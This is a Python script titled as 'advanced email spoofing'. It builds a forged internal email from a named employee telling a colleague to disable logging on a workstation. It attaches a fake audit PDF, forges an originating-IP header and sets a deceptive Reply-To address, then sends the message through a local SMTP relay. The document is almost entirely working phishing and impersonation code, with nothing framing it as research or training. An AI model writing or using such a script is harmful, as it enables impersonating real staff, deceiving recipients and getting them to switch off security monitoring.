import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
import random

def advanced_email_spoofing():
    sender = "rachel.simmons@evergreentrust.com"
    recipients = ["michael.tan@evergreentrust.com"]
    subject = "Critical Audit Request: Action Required"
    body = """
    <html>
        <body>
            <p>Michael,</p>
            <p>Please review the attached document and ensure that logging is disabled for Workstation-12. Contact me immediately if you encounter any issues.</p>
            <p><img src="cid:logo"></p>
            <p>Best regards,</p>
            <p>Rachel Simmons</p>
        </body>
    </html>
    """

    # Create email
    msg = MIMEMultipart("related")
    msg['From'] = sender
    msg['To'] = ", ".join(recipients)
    msg['Subject'] = subject

    # Attach HTML body
    msg.attach(MIMEText(body, 'html'))

    # Inline logo image
    with open("logo.png", "rb") as img_file:
        img = MIMEImage(img_file.read())
        img.add_header("Content-ID", "<logo>")
        msg.attach(img)

    # Attach document
    filename = "audit_instructions.pdf"
    with open(filename, "wb") as f:
        f.write(b"Sensitive audit instructions.")
    attachment = open(filename, "rb")
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename={filename}")
    msg.attach(part)

    # Forge headers
    msg.add_header("X-Originating-IP", "192.168.1.100")
    msg.add_header("Reply-To", "fake_support@audit-services.com")

    # Send email
    try:
        with smtplib.SMTP("localhost", 1025) as server:
            server.sendmail(sender, recipients, msg.as_string())
        print("Advanced email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == "__main__":
    advanced_email_spoofing()
